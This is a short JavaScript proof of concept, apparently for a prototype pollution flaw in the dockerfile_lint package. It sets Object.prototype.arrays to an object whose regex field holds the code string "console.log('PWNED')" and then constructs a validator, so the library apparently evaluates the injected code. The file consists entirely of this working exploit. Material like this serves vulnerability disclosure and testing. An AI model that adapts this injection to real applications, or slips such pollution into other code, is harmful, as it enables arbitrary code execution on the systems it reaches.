var path = require('path');
var DockerFileValidator = require('dockerfile_lint');

Object.prototype.arrays = { regex: "console.log('PWNED')" };

var validator = new DockerFileValidator(path.join(__dirname, 'dockerfile_rules.yml'));
